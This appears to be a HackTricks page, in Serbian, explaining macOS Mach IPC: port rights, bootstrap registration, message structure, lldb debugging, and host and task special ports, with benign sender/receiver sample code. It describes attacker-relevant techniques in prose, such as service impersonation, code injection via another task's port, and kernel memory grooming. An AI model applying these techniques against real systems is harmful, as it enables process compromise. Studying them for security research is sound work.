# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging preko Portova

### Osnovne informacije

Mach koristi **taskove** kao **najmanju jedinicu** za deljenje resursa, a svaki task može sadržati **više threadova**. Ovi **taskovi i threadovi preslikani su 1:1 na POSIX procese i threadove**.

Komunikacija između taskova odvija se putem Mach Inter-Process Communication (IPC), uz korišćenje jednosmernih komunikacionih kanala. **Poruke se prenose između portova**, koji funkcionišu kao **redovi poruka** kojima upravlja kernel.

**Port** je **osnovni** element Mach IPC-a. Može se koristiti za **slanje poruka i njihovo primanje**.

Svaki proces ima **IPC tabelu**, u kojoj je moguće pronaći **mach portove procesa**. Ime mach porta je zapravo broj (pointer na kernel objekat).

Proces takođe može poslati ime porta sa određenim pravima **drugom tasku**, a kernel će učiniti da se ovaj unos pojavi u **IPC tabeli drugog taska**.

### Prava portova

Prava portova, koja definišu koje operacije task može da izvršava, ključna su za ovu komunikaciju. Moguća **prava portova** su ([definicije su dostupne ovde](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):<sup>[[1]](#references)</sup>

- **Receive right**, koje omogućava primanje poruka poslatih na port. Mach portovi su MPSC (multiple-producer, single-consumer) redovi, što znači da u celom sistemu može postojati samo **jedno receive right za svaki port** (za razliku od pipe-ova, gde više procesa može posedovati file descriptor-e za kraj za čitanje jednog pipe-a).
- **Task sa Receive** pravom može primati poruke i **kreirati Send prava**, što mu omogućava slanje poruka. Prvobitno samo **sopstveni task ima Receive pravo nad svojim portom**.
- Ako vlasnik Receive prava **umre** ili ga ugasi, **send pravo postaje neupotrebljivo (dead name).**
- **Send right**, koje omogućava slanje poruka na port.
- Send pravo može biti **klonirano**, tako da task koji poseduje Send pravo može klonirati pravo i **dodeliti ga trećem tasku**.
- Imajte na umu da **prava portova** takođe mogu biti **prosleđena** kroz Mach poruke.
- **Send-once right**, koje omogućava slanje jedne poruke na port, nakon čega nestaje.
- Ovo pravo **ne može biti** **klonirano**, ali može biti **premešteno**.
- **Port set right**, koje označava _port set_, a ne jedan port. Uklanjanje poruke iz port seta uklanja poruku sa jednog od portova koji on sadrži. Port set-ovi mogu da se koriste za istovremeno osluškivanje više portova, slično funkcijama `select`/`poll`/`epoll`/`kqueue` u Unix-u.
- **Dead name**, što nije stvarno pravo porta, već samo placeholder. Kada se port uništi, sva postojeća prava portova nad tim portom pretvaraju se u dead names.

**Taskovi mogu preneti SEND prava drugima**, čime im omogućavaju da šalju poruke nazad. **SEND prava takođe mogu biti klonirana, pa task može duplicirati pravo i dati ga trećem tasku**. Ovo, zajedno sa posredničkim procesom poznatim kao **bootstrap server**, omogućava efikasnu komunikaciju između taskova.

### File Ports

File portovi omogućavaju enkapsulaciju file descriptor-a u Mac portovima (korišćenjem Mach prava portova). Moguće je kreirati `fileport` iz datog FD-a pomoću funkcije `fileport_makeport`, kao i kreirati FD iz fileport-a pomoću funkcije `fileport_makefd`.

### Uspostavljanje komunikacije

Kao što je prethodno pomenuto, moguće je slati prava koristeći Mach poruke, međutim, **ne možete poslati pravo ako već nemate pravo** da pošaljete Mach poruku. Kako se onda uspostavlja prva komunikacija?

U tome učestvuje **bootstrap server** (**launchd** na macOS-u). Pošto **svako može dobiti SEND pravo nad bootstrap serverom**, moguće je od njega zatražiti pravo za slanje poruke drugom procesu:

1. Task **A** kreira **novi port**, dobijajući **RECEIVE pravo** nad njim.
2. Task **A**, kao nosilac RECEIVE prava, **generiše SEND pravo za port**.
3. Task **A** uspostavlja **vezu** sa **bootstrap serverom** i **šalje mu SEND pravo** za port koji je prethodno generisao.
- Imajte na umu da svako može dobiti SEND pravo nad bootstrap serverom.
4. Task A šalje poruku `bootstrap_register` bootstrap serveru kako bi **povezao dati port sa imenom** poput `com.apple.taska`
5. Task **B** stupa u interakciju sa **bootstrap serverom** kako bi izvršio bootstrap **lookup za ime** servisa (`bootstrap_lookup`). Da bi bootstrap server mogao da odgovori, task B će mu poslati **SEND pravo za port koji je prethodno kreirao** unutar lookup poruke. Ako je lookup uspešan, **server duplira SEND pravo** primljeno od Task A i **prenosi ga Tasku B**.
- Imajte na umu da svako može dobiti SEND pravo nad bootstrap serverom.
6. Sa ovim SEND pravom, **Task B** može da **pošalje** **poruku** **Tasku A**.
7. Za dvosmernu komunikaciju, task **B** obično generiše novi port sa **RECEIVE** pravom i **SEND** pravom, a zatim **SEND pravo prosleđuje Tasku A**, kako bi on mogao da šalje poruke TASK-u B (dvosmerna komunikacija).

Bootstrap server **ne može da autentifikuje** ime servisa koje task navede. To znači da bi **task** potencijalno mogao da **imitira bilo koji sistemski task**, na primer da lažno **navede ime authorization servisa**, a zatim odobri svaki zahtev.

Apple zatim čuva **imena servisa koje obezbeđuje sistem** u secure configuration fajlovima, koji se nalaze u **SIP-zaštićenim** direktorijumima: `/System/Library/LaunchDaemons` i `/System/Library/LaunchAgents`. Pored imena svakog servisa, čuva se i **povezani binary**. Bootstrap server će kreirati i držati **RECEIVE pravo za svako od ovih imena servisa**.

Za ove unapred definisane servise, **lookup** proces se neznatno razlikuje. Kada se ime servisa traži, launchd dinamički pokreće servis. Novi workflow izgleda ovako:

- Task **B** pokreće bootstrap **lookup** za ime servisa.
- **launchd** proverava da li task radi i, ako ne radi, **pokreće** ga.
- Task **A** (servis) izvršava **bootstrap check-in** (`bootstrap_check_in()`). Ovde **bootstrap** server kreira SEND pravo, zadržava ga i **prenosi RECEIVE pravo Tasku A**.
- launchd duplira **SEND pravo i šalje ga Tasku B**.
- Task **B** generiše novi port sa **RECEIVE** pravom i **SEND** pravom, a zatim **SEND pravo prosleđuje Tasku A** (servisu), kako bi on mogao da šalje poruke TASK-u B (dvosmerna komunikacija).

Međutim, ovaj proces se primenjuje samo na unapred definisane sistemske taskove. Nesistemski taskovi i dalje rade na prvobitno opisani način, što potencijalno može omogućiti impersonation.

> [!CAUTION]
> Zbog toga launchd nikada ne bi trebalo da se sruši, jer će se srušiti ceo sistem.

### Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)<sup>[[4]](#references)</sup>

Funkcija `mach_msg`, u suštini system call, koristi se za slanje i primanje Mach poruka. Funkcija zahteva da poruka koja se šalje bude prvi argument. Ova poruka mora početi strukturom `mach_msg_header_t`, nakon koje slede stvarni podaci poruke. Struktura je definisana na sledeći način:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Procesi koji poseduju _**pravo za prijem**_ mogu da primaju poruke na Mach portu. Suprotno tome, **pošiljaocima** se dodeljuje _**pravo za slanje**_ ili _**pravo za jednokratno slanje**_. Pravo za jednokratno slanje namenjeno je isključivo slanju jedne poruke, nakon čega postaje nevažeće.<sup>[[11]](#references)</sup>

Početno polje **`msgh_bits`** je bitmap:

- Prvi bit (najznačajniji) koristi se za označavanje da je poruka kompleksna (više o ovome u nastavku)
- Treći i četvrti bit koristi kernel
- **5 najmanje značajnih bitova drugog bajta** može se koristiti za **voucher**: drugu vrstu porta za slanje kombinacija ključ/vrednost.
- **5 najmanje značajnih bitova trećeg bajta** može se koristiti za **local port**
- **5 najmanje značajnih bitova četvrtog bajta** može se koristiti za **remote port**

Tipovi koji mogu biti navedeni u voucher, local i remote portovima su sledeći (iz [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Na primer, `MACH_MSG_TYPE_MAKE_SEND_ONCE` može se koristiti da **naznači** da za ovaj port treba izvesti i preneti **send-once** **pravo**. Takođe se može navesti `MACH_PORT_NULL` kako bi se primaocu onemogućilo da odgovori.

Da bi se ostvarila jednostavna **dvosmerna komunikacija**, proces može navesti **mach port** u zaglavlju **mach poruke**, koji se naziva _reply port_ (**`msgh_local_port`**), a preko kojeg **primalac** poruke može **poslati odgovor** na ovu poruku.

> [!TIP]
> Imajte na umu da se ova vrsta dvosmerne komunikacije koristi u XPC porukama koje očekuju odgovor (`xpc_connection_send_message_with_reply` i `xpc_connection_send_message_with_reply_sync`). Međutim, **obično se kreiraju različiti portovi**, kao što je prethodno objašnjeno, kako bi se ostvarila dvosmerna komunikacija.

Ostala polja zaglavlja poruke su:

- `msgh_size`: veličina celog paketa.
- `msgh_remote_port`: port na koji se ova poruka šalje.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: ID ove poruke, koji tumači primalac.

> [!CAUTION]
> Imajte na umu da se **mach poruke šalju preko `mach port`**, koji je komunikacioni kanal ugrađen u mach kernel, sa **jednim primaocem** i **više pošiljalaca**. **Više procesa** može **slati poruke** na mach port, ali u svakom trenutku samo **jedan proces može čitati** sa njega.

Poruke se zatim formiraju od zaglavlja **`mach_msg_header_t`**, iza kojeg slede **telo** i **trailer** (ako postoji), a mogu sadržati i dozvolu za odgovaranje na njih. U tim slučajevima kernel samo treba da prosledi poruku sa jednog task-a na drugi.

**Trailer** predstavlja **informacije koje kernel dodaje poruci** (korisnik ih ne može postaviti), a koje se mogu zatražiti prilikom prijema poruke pomoću zastavica `MACH_RCV_TRAILER_<trailer_opt>` (može se zatražiti više različitih informacija).

#### Kompleksne poruke

Međutim, postoje i druge, složenije poruke, poput onih koje prosleđuju dodatna prava nad portovima ili dele memoriju, kod kojih kernel takođe mora da pošalje ove objekte primaocu. U tim slučajevima postavlja se najznačajniji bit zaglavlja `msgh_bits`.

Mogući deskriptori za prosleđivanje definisani su u [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
U 32-bitnom režimu, svi deskriptori imaju 12 B, a tip deskriptora se nalazi u jedanaestom bajtu. U 64-bitnom režimu, veličine variraju.

> [!CAUTION]
> kernel će kopirati deskriptore iz jednog task-a u drugi, ali će najpre **napraviti kopiju u kernel memoriji**. Ova tehnika, poznata kao "Feng Shui", zloupotrebljavana je u nekoliko exploit-a kako bi se **kernel naterao da kopira podatke u svoju memoriju**, tako što proces šalje deskriptore samom sebi. Proces zatim može da primi poruke (kernel će ih osloboditi).
>
> Takođe je moguće **poslati port prava ranjivom procesu**, a port prava će se jednostavno pojaviti u procesu (čak i ako ih on ne obrađuje).

### Mac Ports API-ji

Imajte na umu da su port-ovi povezani sa task namespace-om, pa se prilikom kreiranja ili pretrage port-a upituje i task namespace (više u `mach/mach_port.h`):<sup>[[6]](#references)</sup>

- **`mach_port_allocate` | `mach_port_construct`**: **Kreiranje** port-a.
- `mach_port_allocate` takođe može da kreira **port set**: pravo prijema nad grupom port-ova. Kad god se primi poruka, naznačen je port sa kog je poruka stigla.
- `mach_port_allocate_name`: Promena imena port-a (podrazumevano 32-bitni integer)
- `mach_port_names`: Dobijanje imena port-ova od target-a
- `mach_port_type`: Dobijanje prava task-a nad imenom
- `mach_port_rename`: Preimenovanje port-a (kao `dup2` za FD-ove)
- `mach_port_allocate`: Alociranje novog RECEIVE, PORT_SET ili DEAD_NAME
- `mach_port_insert_right`: Kreiranje novog prava u port-u nad kojim imate RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Funkcije koje se koriste za **slanje i prijem mach poruka**. Verzija overwrite omogućava navođenje drugog bafera za prijem poruke (druga verzija će ga samo ponovo koristiti).

### Debug mach_msg

Pošto su funkcije **`mach_msg`** i **`mach_msg_overwrite`** one koje se koriste za slanje i prijem poruka, postavljanje breakpoint-a na njih omogućava analizu poslatih i primljenih poruka.

Na primer, započnite debug bilo koje aplikacije koju možete da debagujete, jer će ona učitati **`libSystem.B`, koja će koristiti ovu funkciju**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Da biste dobili argumente funkcije **`mach_msg`**, proverite registre. Ovo su argumenti (iz [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Preuzmite vrednosti iz registara:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Pregledajte zaglavlje poruke proveravajući prvi argument:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Тај тип `mach_msg_bits_t` је веома чест како би омогућио одговор.

### Енумерисање портова
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**name** је подразумевани назив додељен порту (проверите како се **повећава** у прва 3 бајта). **`ipc-object`** је **обфусцирани** јединствени **идентификатор** порта.\
Такође обратите пажњу на то како портови који имају само право **`send`** **идентификују власника** (назив порта + pid).\
Такође обратите пажњу на употребу знака **`+`** за означавање **других задатака повезаних на исти порт**.

Такође је могуће користити [**procesxp**](https://www.newosxbook.com/tools/procexp.html) за приказ и **регистрованих назива сервиса** (са онемогућеним SIP-ом због потребе за `com.apple.system-task-port`):
```
procesp 1 ports
```
Ovaj alat možete instalirati na iOS tako što ćete ga preuzeti sa [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Primer koda

Obratite pažnju na to kako **pošiljalac** **alocira** port, kreira **send right** za ime `org.darlinghq.example` i šalje ga **bootstrap serveru**, dok pošiljalac traži **send right** za to ime i koristi ga za **slanje poruke**.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Privileged Ports

Postoje neki posebni portovi koji omogućavaju **izvršavanje određenih osetljivih radnji ili pristup određenim osetljivim podacima** u slučaju da task ima **SEND** dozvole nad njima. Zbog toga su ovi portovi veoma interesantni iz perspektive napadača, ne samo zbog svojih mogućnosti već i zato što je moguće **deliti SEND dozvole između taskova**.

### Host Special Ports

Ovi portovi su predstavljeni brojem.

Prava **SEND** mogu se dobiti pozivanjem **`host_get_special_port`**, a prava **RECEIVE** pozivanjem **`host_set_special_port`**. Međutim, oba poziva zahtevaju port **`host_priv`**, kojem samo root može da pristupi. Osim toga, u prošlosti je root mogao da pozove **`host_set_special_port`** i preuzme proizvoljne portove, što je, na primer, omogućavalo zaobilaženje code signatures preuzimanjem `HOST_KEXTD_PORT` (SIP sada to sprečava).

Oni su podeljeni u 2 grupe: **prvih 7 portova poseduje kernel** — 1 je `HOST_PORT`, 2 je `HOST_PRIV_PORT`, 3 je `HOST_IO_MASTER_PORT`, a 7 je `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Portovi koji počinju brojem **8** **pripadaju system daemons** i mogu se pronaći deklarisani u [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Host port**: Ako proces ima **SEND** privilegiju nad ovim portom, može dobiti **informacije** o **sistemu** pozivanjem njegovih rutina, kao što su:
- `host_processor_info`: Dobijanje informacija o procesoru
- `host_info`: Dobijanje informacija o hostu
- `host_virtual_physical_table_info`: Tabela virtuelnih/fizičkih stranica (zahteva MACH_VMDEBUG)
- `host_statistics`: Dobijanje statistike hosta
- `mach_memory_info`: Dobijanje rasporeda kernel memorije
- **Host Priv port**: Proces sa **SEND** pravom nad ovim portom može izvršavati **privileged actions**, kao što su prikazivanje boot podataka ili pokušaj učitavanja kernel extension-a. **Proces mora biti root** da bi dobio ovu dozvolu.
- Osim toga, za pozivanje **`kext_request`** API-ja potrebni su i drugi entitlements **`com.apple.private.kext*`**, koji se dodeljuju samo Apple binarnim fajlovima.
- Ostale rutine koje mogu biti pozvane su:
- `host_get_boot_info`: Dobijanje `machine_boot_info()`
- `host_priv_statistics`: Dobijanje privilegovane statistike
- `vm_allocate_cpm`: Alociranje Contiguous Physical Memory
- `host_processors`: Slanje prava host procesorima
- `mach_vm_wire`: Učiniti memoriju rezidentnom
- Pošto **root** može da pristupi ovoj dozvoli, mogao bi da pozove `host_set_[special/exception]_port[s]` i **preuzme host special ili exception portove**.

Moguće je **videti sve host special portove** pokretanjem:
```bash
procexp all ports | grep "HSP"
```
### Posebni portovi zadatka

Ovo su portovi rezervisani za dobro poznate servise. Njima je moguće pristupiti i podešavati ih pozivanjem `task_[get/set]_special_port`. Mogu se pronaći u fajlu `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):<sup>[[8]](#references)</sup>

- **TASK_KERNEL_PORT**\[task-self send right]: Port koji se koristi za kontrolu ovog task-a. Koristi se za slanje poruka koje utiču na task. Ovo je port koji vraća **mach_task_self (see Task Ports below)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: Bootstrap port task-a. Koristi se za slanje poruka kojima se zahteva vraćanje drugih portova sistemskih servisa.
- **TASK_HOST_NAME_PORT**\[host-self send right]: Port koji se koristi za zahtevanje informacija o host-u koji ga sadrži. Ovo je port koji vraća **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: Port koji označava izvor iz kog ovaj task dobija svoju wired kernel memoriju.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: Port koji označava izvor iz kog ovaj task dobija svoju podrazumevanu memory managed memoriju.

### Task Ports

Mach prvobitno nije imao "procese", već "task-ove", koji su se smatrali više kao kontejneri thread-ova. Kada je Mach spojen sa BSD-om, **svaki task je povezan sa jednim BSD procesom**. Zato svaki BSD proces ima detalje potrebne da bude proces, a svaki Mach task takođe ima svoje unutrašnje funkcionisanje (osim nepostojećeg pid 0, koji predstavlja `kernel_task`).

Postoje dve veoma zanimljive funkcije povezane sa ovim:<sup>[[7]](#references)</sup>

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Dobija SEND right za task port task-a povezanog sa procesom određenim pomoću `pid` i prosleđuje ga navedenom `target_task_port` (što je obično caller task koji je koristio `mach_task_self()`, ali može biti i SEND port nad drugim task-om).
- `pid_for_task(task, &pid)`: Kada se dobije SEND right za task, pronalazi se sa kojim PID-om je taj task povezan.

Da bi izvršavao akcije unutar task-a, task-u je bio potreban `SEND` right nad samim sobom, pozivanjem `mach_task_self()` (koji koristi `task_self_trap` (28)). Sa ovom dozvolom task može da izvršava nekoliko akcija, kao što su:

- `task_threads`: Dobijanje SEND right-a nad svim task portovima thread-ova task-a
- `task_info`: Dobijanje informacija o task-u
- `task_suspend/resume`: Suspendovanje ili nastavljanje task-a
- `task_[get/set]_special_port`
- `thread_create`: Kreiranje thread-a
- `task_[get/set]_state`: Kontrola stanja task-a
- i još mnogo toga može se pronaći u [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Imajte na umu da je sa SEND right-om nad task port-om **drugog task-a** moguće izvršavati takve akcije nad drugim task-om.

Pored toga, task_port je takođe **`vm_map`** port, koji omogućava **čitanje i menjanje memorije** unutar task-a pomoću funkcija kao što su `vm_read()` i `vm_write()`. To u osnovi znači da će task sa SEND right-om nad task_port-om drugog task-a moći da **ubaci code u taj task**.

Imajte na umu da je **kernel takođe task**. Ako neko uspe da dobije **SEND permissions** nad **`kernel_task`**, moći će da natera kernel da izvrši bilo šta (jailbreaks).

- Pozovite `mach_task_self()` da biste **dobili ime** ovog porta za caller task. Ovaj port se samo **nasleđuje** tokom **`exec()`**; novi task kreiran pomoću `fork()` dobija novi task port (kao poseban slučaj, task takođe dobija novi task port nakon `exec()` u suid binariju). Jedini način da se spawn-uje task i dobije njegov port jeste izvođenje ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) tokom `fork()`.
- Ovo su ograničenja za pristup portu (iz `macos_task_policy` binarnog fajla `AppleMobileFileIntegrity`):
- Ako aplikacija ima **`com.apple.security.get-task-allow` entitlement**, procesi **istog user-a mogu da pristupe task port-u** (Xcode ga često dodaje radi debugging-a). Proces **notarization**-a to neće dozvoliti u production izdanjima.
- Aplikacije sa **`com.apple.system-task-ports`** entitlement-om mogu dobiti **task port za bilo koji** proces, osim za kernel. U starijim verzijama zvao se **`task_for_pid-allow`**. Ovo se dodeljuje samo Apple aplikacijama.
- **Root može da pristupi task portovima** aplikacija koje nisu kompajlirane sa **hardened** runtime-om (i nisu od Apple-a).

**The task name port:** Neprivilegovana verzija _task port_-a. Referencira task, ali ne omogućava njegovu kontrolu. Jedina stvar koja je, čini se, dostupna kroz njega jeste `task_info()`.

### Thread Ports

